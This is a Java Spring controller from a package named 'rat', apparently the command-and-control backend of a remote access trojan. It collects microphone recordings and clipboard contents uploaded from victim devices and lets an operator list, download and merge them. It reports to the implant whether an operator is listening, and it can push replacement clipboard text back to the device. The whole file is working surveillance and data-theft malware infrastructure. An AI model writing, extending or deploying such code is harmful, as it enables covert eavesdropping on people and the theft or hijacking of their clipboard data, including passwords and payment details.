package com.example.rat;

import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Comparator;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;
import java.util.stream.Collectors;
import java.util.stream.Stream;
import org.springframework.http.MediaType;
import org.springframework.http.ResponseEntity;
import org.springframework.http.ResponseEntity.BodyBuilder;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.multipart.MultipartFile;

@RestController
@RequestMapping("/api")
public class MicClipboardController {
   private static final ObjectMapper JSON = new ObjectMapper();
   private static final int MIC_MAX = 300;
   private static final int CLIP_MAX = 500;
   private static final Map<String, Long> PAGE_POLL = new ConcurrentHashMap<>();
   private static final long PAGE_POLL_TTL_MS = 15000L;

   private static String safeKey(String key) {
      if (key != null && !key.trim().isEmpty()) {
         String k = key.trim().replaceAll("[^a-zA-Z0-9._-]", "_");
         return k.length() > 128 ? k.substring(0, 128) : k;
      } else {
         return "unknown";
      }
   }

   private static String safeName(String name, String ext) {
      if (name == null) {
         return "";
      }

      String n = name.trim().replaceAll("[^a-zA-Z0-9._-]", "");
      return !n.endsWith(ext) ? "" : n;
   }

   private static Path micDir(String key) {
      return Paths.get("data", "mic", safeKey(key));
   }

   private static Path micDevDir(String key, String device) {
      return device != null && !device.trim().isEmpty() ? micDir(key).resolve(safeKey(device)) : micDir(key);
   }

   private static Path clipDir(String key) {
      return Paths.get("data", "clipboard", safeKey(key));
   }

   private static Path clipDevDir(String key, String device) {
      return device != null && !device.trim().isEmpty() ? clipDir(key).resolve(safeKey(device)) : clipDir(key);
   }

   private static List<Path> listJson(Path dir) {
      List<Path> files = new ArrayList<>();
      if (!Files.isDirectory(dir)) {
         return files;
      }

      try {
         Stream<Path> s = Files.list(dir);

         try {
            files = s.filter(x$0 -> Files.isRegularFile(x$0)).filter(p -> p.getFileName().toString().endsWith(".json")).sorted().collect(Collectors.toList());
         } catch (Throwable var6) {
            if (s != null) {
               try {
                  s.close();
               } catch (Throwable var5) {
                  var6.addSuppressed(var5);
               }
            }

            throw var6;
         }

         if (s != null) {
            s.close();
         }
      } catch (Exception var7) {
      }

      return files;
   }

   private static void prune(Path dir, int max) {
      try {
         Stream<Path> s = Files.list(dir);

         try {
            List<Path> files = s.filter(x$0 -> Files.isRegularFile(x$0)).sorted().collect(Collectors.toList());
            int remove = files.size() - max;

            for (int i = 0; i < remove; i++) {
               try {
                  Files.deleteIfExists(files.get(i));
               } catch (Exception var8) {
               }
            }
         } catch (Throwable var9) {
            if (s != null) {
               try {
                  s.close();
               } catch (Throwable var7) {
                  var9.addSuppressed(var7);
               }
            }

            throw var9;
         }

         if (s != null) {
            s.close();
         }
      } catch (Exception var10) {
      }
   }

   @PostMapping("/mic/upload")
   public ResponseEntity<String> micUpload(
      @RequestParam("key") String key, @RequestParam(value = "device", required = false) String device, @RequestParam("audio") MultipartFile audio
   ) throws IOException {
      Path dir = micDevDir(key, device);
      Files.createDirectories(dir);
      Path f = dir.resolve(System.currentTimeMillis() + ".wav");
      InputStream in = audio.getInputStream();

      try {
         Files.copy(in, f, StandardCopyOption.REPLACE_EXISTING);
      } catch (Throwable var10) {
         if (in != null) {
            try {
               in.close();
            } catch (Throwable var9) {
               var10.addSuppressed(var9);
            }
         }

         throw var10;
      }

      if (in != null) {
         in.close();
      }

      prune(dir, 300);
      return ResponseEntity.ok("{\"ok\":true}");
   }

   private static Path micStatusFile(String key) {
      return Paths.get("data", "mic", safeKey(key) + ".status.json");
   }

   private static Path micStatusFile(String key, String device) {
      return device != null && !device.trim().isEmpty() ? micDir(key).resolve(safeKey(device) + ".status.json") : micStatusFile(key);
   }

   @PostMapping("/mic/status")
   public ResponseEntity<String> micStatusReport(
      @RequestParam("key") String key, @RequestParam(value = "device", required = false) String device, @RequestBody(required = false) String body
   ) throws IOException {
      Path sf = micStatusFile(key, device);
      Files.createDirectories(sf.getParent());
      Files.write(sf, (body == null ? "{}" : body).getBytes(StandardCharsets.UTF_8));
      return ResponseEntity.ok("{\"ok\":true,\"listeners\":" + listeners(key, device) + "}");
   }

   private static int listeners(String key, String device) {
      String id = safeKey(key) + "|" + (device == null ? "" : safeKey(device));
      Long at = PAGE_POLL.get(id);
      return at != null && System.currentTimeMillis() - at < 15000L ? 1 : 0;
   }

   @GetMapping("/mic/listeners")
   public Map<String, Object> micListeners(@RequestParam("key") String key, @RequestParam(value = "device", required = false) String device) {
      Map<String, Object> r = new LinkedHashMap<>();
      r.put("listeners", listeners(key, device));
      return r;
   }

   @GetMapping("/mic/status")
   public Map<String, Object> micStatus(@RequestParam("key") String key, @RequestParam(value = "device", required = false) String device) throws IOException {
      PAGE_POLL.put(safeKey(key) + "|" + (device == null ? "" : safeKey(device)), System.currentTimeMillis());
      Path dir = micDevDir(key, device);
      Map<String, Object> r = new LinkedHashMap<>();
      long count = 0L;
      if (Files.isDirectory(dir)) {
         Stream<Path> s = Files.list(dir);

         try {
            count = s.filter(p -> p.getFileName().toString().endsWith(".wav")).count();
         } catch (Throwable var12) {
            if (s != null) {
               try {
                  s.close();
               } catch (Throwable var10) {
                  var12.addSuppressed(var10);
               }
            }

            throw var12;
         }

         if (s != null) {
            s.close();
         }
      }

      r.put("active", count > 0L);
      r.put("files", count);
      Path sf = micStatusFile(key, device);
      if (Files.isRegularFile(sf)) {
         try {
            JsonNode n = JSON.readTree(Files.readAllBytes(sf));
            if (n != null) {
               if (n.has("hasMic")) {
                  r.put("hasMic", n.get("hasMic").asBoolean());
               }

               if (n.has("devices")) {
                  r.put("devices", n.get("devices").asInt());
               }

               if (n.has("capturing")) {
                  r.put("capturing", n.get("capturing").asBoolean());
               }

               if (n.has("state")) {
                  r.put("state", n.get("state").asText());
               }

               if (n.has("error") && !n.get("error").isNull()) {
                  r.put("error", n.get("error").asText());
               }
            }
         } catch (Exception var11) {
         }
      }

      return r;
   }

   @GetMapping("/mic/list")
   public List<Map<String, Object>> micList(
      @RequestParam("key") String key,
      @RequestParam(value = "device", required = false) String device,
      @RequestParam(value = "legacy", required = false, defaultValue = "false") boolean legacy
   ) throws IOException {
      List<Path> files = new ArrayList<>();
      files.addAll(wavsIn(micDevDir(key, device)));
      if (legacy && device != null && !device.trim().isEmpty()) {
         files.addAll(wavsIn(micDir(key)));
         files.sort(Comparator.comparing(px -> px.getFileName().toString()));
      }

      List<Map<String, Object>> out = new ArrayList<>();
      int from = Math.max(0, files.size() - 300);

      for (Path p : files.subList(from, files.size())) {
         Map<String, Object> m = new LinkedHashMap<>();
         String name = p.getFileName().toString();
         m.put("name", name);
         m.put("time", parseTs(name, ".wav"));
         m.put("size", Files.size(p));
         out.add(m);
      }

      return out;
   }

   private static List<Path> wavsIn(Path dir) throws IOException {
      if (!Files.isDirectory(dir)) {
         return new ArrayList<>();
      }

      Stream<Path> s = Files.list(dir);

      List var2;
      try {
         var2 = s.filter(x$0 -> Files.isRegularFile(x$0)).filter(p -> p.getFileName().toString().endsWith(".wav")).sorted().collect(Collectors.toList());
      } catch (Throwable var5) {
         if (s != null) {
            try {
               s.close();
            } catch (Throwable var4) {
               var5.addSuppressed(var4);
            }
         }

         throw var5;
      }

      if (s != null) {
         s.close();
      }

      return var2;
   }

   @GetMapping("/mic/chunk")
   public ResponseEntity<byte[]> micChunk(
      @RequestParam("key") String key, @RequestParam(value = "device", required = false) String device, @RequestParam("name") String name
   ) throws IOException {
      String safe = safeName(name, ".wav");
      if (safe.isEmpty()) {
         return ResponseEntity.badRequest().build();
      }

      Path f = micDevDir(key, device).resolve(safe);
      if (!Files.isRegularFile(f)) {
         return ResponseEntity.notFound().build();
      }

      byte[] data = Files.readAllBytes(f);
      return ResponseEntity.ok().contentType(MediaType.parseMediaType("audio/wav")).body(data);
   }

   @PostMapping("/clipboard/upload")
   public ResponseEntity<String> clipboardUpload(
      @RequestParam("key") String key, @RequestParam(value = "device", required = false) String device, @RequestBody(required = false) String body
   ) throws IOException {
      Path dir = clipDevDir(key, device);
      Files.createDirectories(dir);
      Path f = dir.resolve(System.currentTimeMillis() + ".json");
      Files.write(f, (body == null ? "" : body).getBytes(StandardCharsets.UTF_8));
      prune(dir, 500);
      return ResponseEntity.ok("{\"ok\":true}");
   }

   @GetMapping("/clipboard/list")
   public List<Map<String, Object>> clipboardList(
      @RequestParam("key") String key,
      @RequestParam(value = "device", required = false) String device,
      @RequestParam(value = "legacy", required = false, defaultValue = "false") boolean legacy
   ) throws IOException {
      List<Path> files = new ArrayList<>(listJson(clipDevDir(key, device)));
      if (legacy && device != null && !device.trim().isEmpty()) {
         files.addAll(listJson(clipDir(key)));
         files.sort(Comparator.comparing(px -> px.getFileName().toString()));
      }

      List<Map<String, Object>> out = new ArrayList<>();
      int from = Math.max(0, files.size() - 100);

      for (Path p : files.subList(from, files.size())) {
         String raw = new String(Files.readAllBytes(p), StandardCharsets.UTF_8);
         Map<String, Object> m = new LinkedHashMap<>();
         String name = p.getFileName().toString();
         m.put("time", parseTs(name, ".json"));
         m.put("content", extractContent(raw));
         out.add(m);
      }

      Collections.reverse(out);
      return out;
   }

   @PostMapping("/clipboard/clear")
   public ResponseEntity<String> clipboardClear(
      @RequestParam("key") String key,
      @RequestParam(value = "device", required = false) String device,
      @RequestParam(value = "legacy", required = false, defaultValue = "true") boolean legacy
   ) throws IOException {
      int deleted = 0;
      if (device != null && !device.trim().isEmpty()) {
         Path dir = clipDevDir(key, device);

         for (Path p : listJson(dir)) {
            try {
               Files.deleteIfExists(p);
               deleted++;
            } catch (Exception var10) {
            }
         }
      }

      if (legacy) {
         for (Path p : listJson(clipDir(key))) {
            try {
               Files.deleteIfExists(p);
               deleted++;
            } catch (Exception var9) {
            }
         }
      }

      return ResponseEntity.ok("{\"ok\":true,\"deleted\":" + deleted + "}");
   }

   @GetMapping("/mic/merge")
   public ResponseEntity<byte[]> micMerge(
      @RequestParam("key") String key,
      @RequestParam(value = "device", required = false) String device,
      @RequestParam(value = "legacy", required = false, defaultValue = "false") boolean legacy
   ) throws IOException {
      List<Path> files = new ArrayList<>(wavsIn(micDevDir(key, device)));
      if (legacy && device != null && !device.trim().isEmpty()) {
         files.addAll(wavsIn(micDir(key)));
         files.sort(Comparator.comparing(p -> p.getFileName().toString()));
      }

      int limit = 60;
      ByteArrayOutputStream pcm = new ByteArrayOutputStream();
      int from = Math.max(0, files.size() - limit);

      for (Path p : files.subList(from, files.size())) {
         byte[] data = Files.readAllBytes(p);
         int off = wavDataOffset(data);
         if (off > 0 && off < data.length) {
            pcm.write(data, off, data.length - off);
         }
      }

      byte[] pcmBytes = pcm.toByteArray();
      ByteArrayOutputStream wav = new ByteArrayOutputStream();
      writeWavHeaderS(wav, pcmBytes.length);
      wav.write(pcmBytes);
      byte[] out = wav.toByteArray();
      return ((BodyBuilder)ResponseEntity.ok()
            .contentType(MediaType.parseMediaType("audio/wav"))
            .header("Content-Disposition", new String[]{"attachment; filename=\"mic-merge.wav\""}))
         .body(out);
   }

   private static Path clipPendingFile(String key) {
      return Paths.get("data", "clipboard", safeKey(key) + ".pending");
   }

   @PostMapping("/clipboard/set")
   public ResponseEntity<String> clipboardSet(@RequestParam("key") String key, @RequestBody(required = false) String text) throws IOException {
      Path f = clipPendingFile(key);
      Path parent = f.getParent();
      if (parent != null) {
         Files.createDirectories(parent);
      }

      Files.write(f, (text == null ? "" : text).getBytes(StandardCharsets.UTF_8));
      return ResponseEntity.ok("{\"ok\":true}");
   }

   @GetMapping("/clipboard/pull")
   public ResponseEntity<String> clipboardPull(@RequestParam("key") String key) throws IOException {
      Path f = clipPendingFile(key);
      if (!Files.isRegularFile(f)) {
         return ResponseEntity.ok("");
      }

      String text = new String(Files.readAllBytes(f), StandardCharsets.UTF_8);
      Files.deleteIfExists(f);
      return ResponseEntity.ok(text);
   }

   private static int wavDataOffset(byte[] data) {
      for (int i = 12; i + 8 <= data.length; i++) {
         if (data[i] == 100 && data[i + 1] == 97 && data[i + 2] == 116 && data[i + 3] == 97) {
            return i + 8;
         }
      }

      return -1;
   }

   private static void writeWavHeaderS(OutputStream out, int dataSize) throws IOException {
      int totalSize = 36 + dataSize;
      out.write("RIFF".getBytes(StandardCharsets.US_ASCII));
      writeLEInt(out, totalSize);
      out.write("WAVE".getBytes(StandardCharsets.US_ASCII));
      out.write("fmt ".getBytes(StandardCharsets.US_ASCII));
      writeLEInt(out, 16);
      writeLEShort(out, (short)1);
      writeLEShort(out, (short)1);
      writeLEInt(out, 44100);
      writeLEInt(out, 88200);
      writeLEShort(out, (short)2);
      writeLEShort(out, (short)16);
      out.write("data".getBytes(StandardCharsets.US_ASCII));
      writeLEInt(out, dataSize);
   }

   private static void writeLEInt(OutputStream out, int v) throws IOException {
      out.write(v & 0xFF);
      out.write(v >> 8 & 0xFF);
      out.write(v >> 16 & 0xFF);
      out.write(v >> 24 & 0xFF);
   }

   private static void writeLEShort(OutputStream out, short v) throws IOException {
      out.write(v & 255);
      out.write(v >> 8 & 0xFF);
   }

   private static String extractContent(String raw) {
      try {
         JsonNode n = JSON.readTree(raw);
         if (n != null && n.has("content")) {
            return n.get("content").asText();
         }
      } catch (Exception var2) {
      }

      return raw;
   }

   private static long parseTs(String name, String ext) {
      try {
         return Long.parseLong(name.substring(0, name.length() - ext.length()));
      } catch (Exception e) {
         return 0L;
      }
   }
}
